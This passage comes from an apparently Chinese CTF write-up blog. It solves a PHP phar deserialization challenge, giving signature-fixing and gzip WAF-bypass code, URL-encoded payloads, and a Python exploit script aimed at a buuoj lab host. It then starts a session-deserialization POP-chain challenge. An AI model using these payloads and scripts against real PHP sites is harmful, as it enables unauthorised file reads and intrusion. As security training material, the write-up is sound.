class="hljs-regexp">//</span>删除之前的test.par文件(如果有)<br><span class="hljs-variable">$phar</span> = new Phar(<span class="hljs-string">&quot;test.phar&quot;</span>); <span class="hljs-regexp">//</span>后缀名必须为phar<br><span class="hljs-variable">$phar</span>-&gt;startBuffering();<br><span class="hljs-variable">$phar</span>-&gt;setStub(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-regexp">//</span>设置stub<br><span class="hljs-variable">$phar</span>-&gt;setMetadata(<span class="hljs-variable">$a</span>); <span class="hljs-regexp">//</span>将自定义的meta-data存入manifest<br><span class="hljs-variable">$phar</span>-&gt;addFromString(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-regexp">//</span>添加要压缩的文件,随便新建一个文件内容随意<br><span class="hljs-variable">$phar</span>-&gt;stopBuffering();<br></code></pre></td></tr></table></figure>

<p>第二步，绕过<code>throw</code>，</p>
<p>throw会阻碍析构函数进行，通过gc垃圾回收机制提前触发析构函数，</p>
<p>所以需要修改Metadata来绕过抛出异常，</p>
<p>用D这个读写类来举例，如果正常传入数据是无法触发<code>__destruct</code>的，我们可以去掉末尾的大括号，这样会在反序列化时报错触发<code>__destruct</code></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">修改前：<span class="hljs-attribute">1</span>=O:1:&quot;D&quot;:1:&#123;s:5:<span class="hljs-string">&quot;start&quot;</span>;s:1:<span class="hljs-string">&quot;w&quot;</span>;&#125;&amp;<span class="hljs-attribute">0</span>=123<br>修改后：<span class="hljs-attribute">1</span>=O:1:&quot;D&quot;:1:&#123;s:5:<span class="hljs-string">&quot;start&quot;</span>;s:1:<span class="hljs-string">&quot;w&quot;</span>;&amp;<span class="hljs-attribute">0</span>=123<br></code></pre></td></tr></table></figure>

<p>或者传入序列化的数组，再将长度改的不匹配</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">修改前：<span class="hljs-attribute">1</span>=a:2:&#123;i:0;O:1:<span class="hljs-string">&quot;D&quot;</span>:1:&#123;s:5:<span class="hljs-string">&quot;start&quot;</span>;s:1:<span class="hljs-string">&quot;w&quot;</span>;&#125;i:1;s:1:<span class="hljs-string">&quot;1&quot;</span>;&#125;&amp;<span class="hljs-attribute">0</span>=123<br>修改后：<span class="hljs-attribute">1</span>=a:2:&#123;i:0;O:1:<span class="hljs-string">&quot;D&quot;</span>:1:&#123;s:5:<span class="hljs-string">&quot;start&quot;</span>;s:1:<span class="hljs-string">&quot;w&quot;</span>;&#125;i:1;s:0:<span class="hljs-string">&quot;1&quot;</span>;&#125;&amp;<span class="hljs-attribute">0</span>=123<br></code></pre></td></tr></table></figure>

<p>这里采用第一种方法，我们用010editor删除最后的大括号，</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">改为<br>O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;tree&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;apple&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;xxx&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;air&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;p&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;tree&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;N;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;act&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;SplFileObject&quot;</span>;&#125;&#125;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;flag&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;/fflaggg&quot;</span>;&#125;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;act&quot;</span>;N;<br></code></pre></td></tr></table></figure>

<p>但是这会导致原本的phar签名匹配不上，需要手动修复一下phar的签名</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> hashlib import sha1<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).<span class="hljs-built_in">read</span>() <span class="hljs-comment"># 修改内容后的phar文件</span><br>s = f[:<span class="hljs-number">-28</span>] <span class="hljs-comment"># 获取要签名的数据</span><br>h = f[<span class="hljs-number">-8</span>:] <span class="hljs-comment"># 获取签名类型以及GBMB标识</span><br>newf = s+sha1(s).digest()+h <span class="hljs-comment"># 数据 + 签名 + 类型 + GBMB</span><br><span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;fixed_test.phar&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>).<span class="hljs-built_in">write</span>(newf) <span class="hljs-comment"># 写入新文件</span><br></code></pre></td></tr></table></figure>

<p>第三步，绕过waf</p>
<p>waf中含有各种类名，我们可以把phar进行压缩，这样可以绕过限制</p>
<p><a target="_blank" rel="noopener" href="https://guokeya.github.io/post/uxwHLckwx/">https://guokeya.github.io/post/uxwHLckwx/</a></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503032334787.png" srcset="/img/loading.gif" lazyload alt="image-20250303233444690"></p>
<p>然后以url编码形式输出文件内容</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">import urllib.parse<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;fixed_test.phar.gz&quot;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> fi:<br>    f = fi.<span class="hljs-built_in">read</span>()<br>    ff = urllib.parse.<span class="hljs-literal">quote</span>(f)  <span class="hljs-comment"># 获取信息</span><br>    print(ff)<br></code></pre></td></tr></table></figure>

<p>输出后构造payload，</p>
<p>写入phar文件</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">0</span><span class="hljs-operator">=</span><span class="hljs-variable">%1</span>F<span class="hljs-variable">%8</span>B<span class="hljs-variable">%08</span><span class="hljs-variable">%08</span><span class="hljs-variable">%F1</span><span class="hljs-variable">%CB</span><span class="hljs-variable">%C5g</span><span class="hljs-variable">%00</span><span class="hljs-variable">%03</span>fixed_test.phar<span class="hljs-variable">%00</span>s<span class="hljs-variable">%F7t</span><span class="hljs-variable">%B3</span><span class="hljs-variable">%B0L</span><span class="hljs-variable">%B4</span><span class="hljs-variable">%B1</span>/<span class="hljs-variable">%C8</span><span class="hljs-variable">%28</span>P<span class="hljs-variable">%88</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%F7p</span><span class="hljs-variable">%F4</span><span class="hljs-variable">%09</span><span class="hljs-variable">%89</span>w<span class="hljs-variable">%F6</span><span class="hljs-variable">%F7</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%F0</span><span class="hljs-variable">%F4q</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%D2</span><span class="hljs-variable">%D0</span><span class="hljs-variable">%B4V</span><span class="hljs-variable">%B0</span><span class="hljs-variable">%B7</span><span class="hljs-variable">%E3</span><span class="hljs-variable">%E5z</span><span class="hljs-variable">%C5</span><span class="hljs-variable">%C0</span><span class="hljs-variable">%C0</span><span class="hljs-variable">%C0</span><span class="hljs-variable">%08</span><span class="hljs-variable">%C4</span><span class="hljs-variable">%82</span>P<span class="hljs-variable">%9</span>A<span class="hljs-variable">%81</span>a<span class="hljs-variable">%0</span>B<span class="hljs-variable">%10</span><span class="hljs-variable">%FB</span><span class="hljs-variable">%5</span>B<span class="hljs-variable">%99</span>X<span class="hljs-variable">%29</span><span class="hljs-variable">%95</span><span class="hljs-variable">%14</span><span class="hljs-variable">%A5</span><span class="hljs-variable">%A6</span><span class="hljs-variable">%2</span>AY<span class="hljs-variable">%19</span>YU<span class="hljs-variable">%17</span><span class="hljs-variable">%83</span>xy<span class="hljs-variable">%89</span><span class="hljs-variable">%B9</span><span class="hljs-variable">%A9J</span><span class="hljs-variable">%D6</span><span class="hljs-variable">%FEV</span><span class="hljs-variable">%A6VJ</span><span class="hljs-variable">%89</span><span class="hljs-variable">%05</span><span class="hljs-variable">%0590</span><span class="hljs-variable">%19</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%A5</span><span class="hljs-variable">%8</span>A<span class="hljs-variable">%8</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%90</span><span class="hljs-variable">%04</span><span class="hljs-variable">%90</span><span class="hljs-variable">%95</span><span class="hljs-variable">%98</span>Y<span class="hljs-variable">%A4de</span><span class="hljs-variable">%08</span><span class="hljs-variable">%126</span><span class="hljs-variable">%B4R</span><span class="hljs-variable">%2</span>A<span class="hljs-variable">%00</span><span class="hljs-variable">%09</span><span class="hljs-variable">%E20</span><span class="hljs-variable">%C6</span><span class="hljs-variable">%CF</span><span class="hljs-variable">%1</span>A<span class="hljs-variable">%AC31</span><span class="hljs-variable">%B9D</span><span class="hljs-variable">%09</span><span class="hljs-variable">%C82</span><span class="hljs-variable">%B4</span><span class="hljs-variable">%B0Rr</span><span class="hljs-variable">%CB</span><span class="hljs-variable">%CCI-</span><span class="hljs-variable">%AE</span><span class="hljs-variable">%2</span>C.I<span class="hljs-variable">%CD</span><span class="hljs-variable">%F5</span><span class="hljs-variable">%2</span>CI-J<span class="hljs-variable">%2</span>C<span class="hljs-variable">%C9</span>/R<span class="hljs-variable">%B2</span><span class="hljs-variable">%AE</span><span class="hljs-variable">%AD</span><span class="hljs-variable">%05</span>kI<span class="hljs-variable">%CBIL</span><span class="hljs-variable">%07</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%03</span><span class="hljs-variable">%1</span>A<span class="hljs-variable">%9</span>A<span class="hljs-variable">%9</span>E<span class="hljs-variable">%93</span><span class="hljs-variable">%9</span>Fd<span class="hljs-variable">%A5</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%95</span><span class="hljs-variable">%A6</span><span class="hljs-variable">%05</span><span class="hljs-variable">%94</span>G<span class="hljs-variable">%18</span><span class="hljs-variable">%E2g</span><span class="hljs-variable">%CD</span><span class="hljs-variable">%01</span>tvIjq<span class="hljs-variable">%89</span><span class="hljs-variable">%5</span>EIE<span class="hljs-variable">%09</span><span class="hljs-variable">%0</span>B<span class="hljs-variable">%90</span><span class="hljs-variable">%BD</span><span class="hljs-variable">%EE</span><span class="hljs-variable">%D4</span><span class="hljs-variable">%D1t</span><span class="hljs-variable">%10</span><span class="hljs-variable">%CDSW</span><span class="hljs-variable">%7</span>Fc<span class="hljs-variable">%1</span>B<span class="hljs-variable">%C4g</span><span class="hljs-variable">%60</span><span class="hljs-variable">%F9</span><span class="hljs-variable">%BD</span><span class="hljs-variable">%F7</span><span class="hljs-variable">%D4</span><span class="hljs-variable">%9</span>F<span class="hljs-variable">%2</span>C<span class="hljs-variable">%F3</span><span class="hljs-variable">%95</span>r<span class="hljs-variable">%13</span><span class="hljs-variable">%F6L</span><span class="hljs-variable">%99</span><span class="hljs-variable">%7</span>D<span class="hljs-variable">%FA</span><span class="hljs-variable">%FD</span><span class="hljs-variable">%3</span>FM<span class="hljs-variable">%BB</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%FE</span><span class="hljs-variable">%7</span>F<span class="hljs-variable">%99</span><span class="hljs-variable">%80</span>r<span class="hljs-variable">%EEN</span><span class="hljs-variable">%BEN</span><span class="hljs-variable">%00</span><span class="hljs-variable">%B3C</span><span class="hljs-variable">%29</span><span class="hljs-variable">%E40</span><span class="hljs-variable">%01</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span>&amp;<span class="hljs-number">1</span><span class="hljs-operator">=</span>O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;D&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;start&quot;</span><span class="hljs-comment">;s:1:&quot;w&quot;;&#125;</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503032338264.png" srcset="/img/loading.gif" lazyload alt="image-20250303233824159"></p>
<p>读取phar文件，反序列化使得读出flag文件名</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>=phar:///tmp/<span class="hljs-number">838420275</span>bace68a89cc4842eecbe6b5.jpg&amp;<span class="hljs-number">1</span>=O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;D&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;start&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;r&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503032339128.png" srcset="/img/loading.gif" lazyload alt="image-20250303233950802"></p>
<p>然后我们修改pop链，重复上面步骤，</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">0</span><span class="hljs-operator">=</span><span class="hljs-variable">%1</span>F<span class="hljs-variable">%8</span>B<span class="hljs-variable">%08</span><span class="hljs-variable">%08</span><span class="hljs-variable">%15</span><span class="hljs-variable">%CF</span><span class="hljs-variable">%C5g</span><span class="hljs-variable">%00</span><span class="hljs-variable">%03</span>fixed_test.phar<span class="hljs-variable">%00</span>s<span class="hljs-variable">%F7t</span><span class="hljs-variable">%B3</span><span class="hljs-variable">%B0L</span><span class="hljs-variable">%B4</span><span class="hljs-variable">%B1</span>/<span class="hljs-variable">%C8</span><span class="hljs-variable">%28</span>P<span class="hljs-variable">%88</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%F7p</span><span class="hljs-variable">%F4</span><span class="hljs-variable">%09</span><span class="hljs-variable">%89</span>w<span class="hljs-variable">%F6</span><span class="hljs-variable">%F7</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%F0</span><span class="hljs-variable">%F4q</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%D2</span><span class="hljs-variable">%D0</span><span class="hljs-variable">%B4V</span><span class="hljs-variable">%B0</span><span class="hljs-variable">%B7</span><span class="hljs-variable">%E3</span><span class="hljs-variable">%E5z</span><span class="hljs-variable">%C8</span><span class="hljs-variable">%C0</span><span class="hljs-variable">%C0</span><span class="hljs-variable">%C0</span><span class="hljs-variable">%08</span><span class="hljs-variable">%C4</span><span class="hljs-variable">%82</span>P<span class="hljs-variable">%9</span>A<span class="hljs-variable">%81</span>a<span class="hljs-number">5</span><span class="hljs-variable">%10</span><span class="hljs-variable">%FB</span><span class="hljs-variable">%5</span>B<span class="hljs-variable">%99</span>X<span class="hljs-variable">%29</span><span class="hljs-variable">%95</span><span class="hljs-variable">%14</span><span class="hljs-variable">%A5</span><span class="hljs-variable">%A6</span><span class="hljs-variable">%2</span>AY<span class="hljs-variable">%19</span>YU<span class="hljs-variable">%17</span><span class="hljs-variable">%83</span>xy<span class="hljs-variable">%89</span><span class="hljs-variable">%B9</span><span class="hljs-variable">%A9J</span><span class="hljs-variable">%D6</span><span class="hljs-variable">%FEV</span><span class="hljs-variable">%A6VJ</span><span class="hljs-variable">%89</span><span class="hljs-variable">%05</span><span class="hljs-variable">%0590</span><span class="hljs-variable">%19</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%A5</span><span class="hljs-variable">%8</span>A<span class="hljs-variable">%8</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%90</span><span class="hljs-variable">%04</span><span class="hljs-variable">%90</span><span class="hljs-variable">%95</span><span class="hljs-variable">%98</span>Y<span class="hljs-variable">%A4de</span><span class="hljs-variable">%08</span><span class="hljs-variable">%126</span><span class="hljs-variable">%B4R</span><span class="hljs-variable">%2</span>A<span class="hljs-variable">%00</span><span class="hljs-variable">%09</span><span class="hljs-variable">%E20</span><span class="hljs-variable">%C6</span><span class="hljs-variable">%CF</span><span class="hljs-variable">%1</span>A<span class="hljs-variable">%AC31</span><span class="hljs-variable">%B9D</span><span class="hljs-variable">%09</span><span class="hljs-variable">%C82</span><span class="hljs-variable">%042</span><span class="hljs-variable">%83</span><span class="hljs-variable">%0</span>Br<span class="hljs-variable">%DC2sR</span><span class="hljs-variable">%FD</span><span class="hljs-variable">%93</span><span class="hljs-variable">%B2RA</span><span class="hljs-variable">%82</span><span class="hljs-variable">%B5</span><span class="hljs-variable">%B5</span><span class="hljs-variable">%60</span><span class="hljs-variable">%D5i9</span><span class="hljs-variable">%89</span><span class="hljs-variable">%E9</span><span class="hljs-variable">%20</span><span class="hljs-variable">%15</span><span class="hljs-variable">%16</span>VJ<span class="hljs-variable">%FAi</span><span class="hljs-variable">%20</span>N<span class="hljs-variable">%3</span>A<span class="hljs-variable">%90</span><span class="hljs-variable">%5</span>B<span class="hljs-variable">%8</span>B<span class="hljs-variable">%D0</span><span class="hljs-variable">%EBg</span><span class="hljs-variable">%CD</span><span class="hljs-variable">%01</span>tmIjq<span class="hljs-variable">%89</span><span class="hljs-variable">%5</span>EIE<span class="hljs-variable">%09</span><span class="hljs-variable">%0</span>B<span class="hljs-variable">%90</span><span class="hljs-variable">%DDt</span><span class="hljs-variable">%EEh</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%88</span><span class="hljs-variable">%E6</span><span class="hljs-variable">%A9</span><span class="hljs-variable">%AB</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%B1</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%E2</span><span class="hljs-variable">%21</span><span class="hljs-variable">%B0</span><span class="hljs-variable">%BC</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%D6</span><span class="hljs-variable">%24</span><span class="hljs-variable">%B6</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%BC</span><span class="hljs-variable">%22</span><span class="hljs-variable">%9</span>Er<span class="hljs-variable">%7</span>B.u<span class="hljs-variable">%E7</span><span class="hljs-variable">%DA</span><span class="hljs-variable">%3</span>F<span class="hljs-variable">%3</span>B~<span class="hljs-variable">%DB</span><span class="hljs-variable">%F0</span><span class="hljs-variable">%C4</span><span class="hljs-variable">%5</span>C<span class="hljs-variable">%26</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%9</span>C<span class="hljs-variable">%BB</span><span class="hljs-variable">%93</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%13</span><span class="hljs-variable">%00</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%EC</span><span class="hljs-variable">%AD</span><span class="hljs-variable">%E9</span><span class="hljs-variable">%27</span><span class="hljs-variable">%01</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span>&amp;<span class="hljs-number">1</span><span class="hljs-operator">=</span>O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;D&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;start&quot;</span><span class="hljs-comment">;s:1:&quot;w&quot;;&#125;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>=phar:///tmp/<span class="hljs-number">68</span>af76eb7c0cce5005fc66f33b7641b0.jpg&amp;<span class="hljs-number">1</span>=O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;D&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;start&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;r&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503032351202.png" srcset="/img/loading.gif" lazyload alt="image-20250303235100847"></p>
<p>有人写了一个半自动化的脚本，实测可行</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> gzip<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha1<br>url=<span class="hljs-string">&#x27;http://66388d68-d21a-41fd-a86f-154fc4107bbc.node5.buuoj.cn:81/&#x27;</span><br>def sign(<span class="hljs-type">name</span>):<br>    f = <span class="hljs-keyword">open</span>(<span class="hljs-type">name</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).<span class="hljs-keyword">read</span>() # 修改内容后的phar文件<br>    s = f[:<span class="hljs-number">-28</span>] # 获取要签名的数据<br>    h = f[<span class="hljs-number">-8</span>:] # 获取签名类型以及GBMB标识<br>    newf = s+sha1(s).digest()+h # 数据 + 签名 + 类型 + GBMB<br>    <span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;signed.phar&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>).<span class="hljs-keyword">write</span>(newf) # 写入新文件<br>def compress(<span class="hljs-type">name</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-keyword">open</span>(<span class="hljs-type">name</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f1:<br>        content = f1.<span class="hljs-keyword">read</span>()<br>        f = gzip.<span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;signed.phar.gz&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>)<br>        f.<span class="hljs-keyword">write</span>(content)<br>        f.<span class="hljs-keyword">close</span>()<br>def <span class="hljs-keyword">write</span>(<span class="hljs-type">name</span>):<br>    #O:<span class="hljs-number">1</span>:&quot;D&quot;:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">5</span>:&quot;start&quot;;s:<span class="hljs-number">1</span>:&quot;w&quot;;&#125;<br>    r=requests.post(url,data=&#123;<span class="hljs-string">&#x27;0&#x27;</span>: <span class="hljs-keyword">open</span>(<span class="hljs-type">name</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).<span class="hljs-keyword">read</span>(),<span class="hljs-string">&#x27;1&#x27;</span>:<span class="hljs-string">&#x27;a:2:&#123;i:0;O:1:&quot;D&quot;:1:&#123;s:5:&quot;start&quot;;s:1:&quot;w&quot;;&#125;i:0;i:0;&#125;&#x27;</span>&#125;)<br>    print(r.text)<br>def <span class="hljs-keyword">read</span>(<span class="hljs-type">name</span>):<br>    #O:<span class="hljs-number">1</span>:&quot;D&quot;:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">5</span>:&quot;start&quot;;s:<span class="hljs-number">1</span>:&quot;r&quot;;&#125;<br>    r=requests.post(url,data=&#123;<span class="hljs-string">&#x27;0&#x27;</span>:<span class="hljs-string">&#x27;phar://&#x27;</span>+<span class="hljs-type">name</span>,<span class="hljs-string">&#x27;1&#x27;</span>:<span class="hljs-string">&#x27;a:2:&#123;i:0;O:1:&quot;D&quot;:1:&#123;s:5:&quot;start&quot;;s:1:&quot;r&quot;;&#125;i:0;i:0;&#125;&#x27;</span>&#125;)<br>    print(r.text)<br>def make():<br>    sign(<span class="hljs-string">&#x27;test.phar&#x27;</span>)<br>    compress(<span class="hljs-string">&#x27;signed.phar&#x27;</span>)<br>    <span class="hljs-keyword">write</span>(<span class="hljs-string">&#x27;signed.phar.gz&#x27;</span>)<br><br><br><br><br># make()<br># /tmp/<span class="hljs-number">001</span>df3ffd61e2faa164eee6783ff929b.jpg<br># <span class="hljs-keyword">read</span>(<span class="hljs-string">&#x27;/tmp/001df3ffd61e2faa164eee6783ff929b.jpg&#x27;</span>)<br># fflaggg<br><br># make()<br># /tmp/b1fe36a1465497f88cd1568a157e30d2.jpg<br># <span class="hljs-keyword">read</span>(<span class="hljs-string">&#x27;/tmp/b1fe36a1465497f88cd1568a157e30d2.jpg&#x27;</span>)<br># flag&#123;<span class="hljs-number">149</span>dd7e1<span class="hljs-number">-4</span>cd8<span class="hljs-number">-4590</span>-aff2-bae99e772daa&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503040004698.png" srcset="/img/loading.gif" lazyload alt="image-20250304000440588"></p>
<h1 id="DASCTF-X-GFCTF-2024｜四月开启第一局-web1234"><a href="#DASCTF-X-GFCTF-2024｜四月开启第一局-web1234" class="headerlink" title="[DASCTF X GFCTF 2024｜四月开启第一局]web1234"></a>[DASCTF X GFCTF 2024｜四月开启第一局]web1234</h1><p>没有前端，用dirsearch扫出&#x2F;robots.txt和<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503041424811.png" srcset="/img/loading.gif" lazyload alt="image-20250224225954012"></p>
<p>下载<a target="_blank" rel="noopener" href="http://www.zip,原来是源码/">www.zip，原来是源码</a></p>
<p>代码审计，获得登录方式</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502252248659.png" srcset="/img/loading.gif" lazyload alt="image-20250225224848542"></p>
<p>在class.php中找到初始值</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502252250857.png" srcset="/img/loading.gif" lazyload alt="image-20250225225006754"></p>
<p>md5解码</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502252251501.png" srcset="/img/loading.gif" lazyload alt="image-20250225225101228"></p>
<p>登录成功<code>http://ce62e496-2433-41bd-878a-963385664769.node5.buuoj.cn:81/?uname=admin&amp;passwd=1q2w3e</code></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502252342616.png" srcset="/img/loading.gif" lazyload alt="image-20250225234217473"></p>
<p>根据提示，这里是session反序列化，</p>
<blockquote>
<p>启动了session_start以后，就会找sess_XXX里的内容进行反序列化，反序列化后得到$Session对象，比如下面的aaa|O:6:”Config”:…就是对应的$_SESSION[‘aaa’]，然后在程序执行完要退出之前，会重新把$SESSION写进sess_XXX文件，也就是序列化的过程，从而触发_sleep</p>
<p>(即写回去的时候就是序列化前面反序列化的对象)</p>
<p>这种Session的设计理念其实很好理解，如若不然，session存用户的登录状态，用户每次访问，哪怕所有属性都原封不动没有改变，代码都得手动设置$_SESSION[‘user’]&#x3D;xxx，这样显然是不合理的</p>
<p>事实上$_SESSION[‘user’]&#x3D;xxx往往只用于改变用户属性</p>
</blockquote>
<p>上面我们讲了session触发sleep函数，然后我们构造pop链如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Config</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$uname</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$avatar</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nickname</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sex</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mail</span>;<br>    <span class="hljs-keyword">public</span> <span 